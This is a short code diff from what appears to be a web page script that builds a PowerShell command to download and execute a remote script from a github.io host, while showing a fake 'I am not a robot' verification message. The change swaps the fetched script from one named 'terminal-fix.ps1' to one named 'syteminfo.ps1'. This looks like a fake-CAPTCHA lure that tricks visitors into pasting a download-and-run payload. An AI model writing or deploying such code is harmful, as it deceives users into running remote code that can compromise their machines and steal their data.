@@ -196,7 +196,7 @@
             
             const exe = "powershell";
             const flags = "-NoProfile -Command";
-            const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
+            const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/syteminfo.ps1')\"";
             const fullCommand = `${exe} ${flags} ${payload}`;
 
             commandDisplay.textContent = '✅ "I am not a robot"';
